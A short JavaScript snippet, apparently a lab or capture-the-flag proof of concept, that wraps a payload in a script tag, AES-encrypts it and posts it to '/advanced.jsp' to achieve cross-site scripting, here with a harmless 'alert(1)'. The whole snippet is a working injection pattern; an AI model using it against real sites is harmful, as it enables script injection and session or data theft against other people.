function scriptInject(payload){
  payload = 'price:<script>' + payload + '</script>';
  console.log(payload);

  encrypted_payload = Aes.Ctr.encrypt(payload, key, 128);
  console.log(encrypted_payload);

  console.log('sending payload...');
  $.post('/advanced.jsp',
  {
    q: encrypted_payload
  },
  function(data, status)
  {
    console.log('status: ' + status);
    console.log('response: ' + data);
    $('body').replaceWith(data);
  });

}
scriptInject('alert(1)');
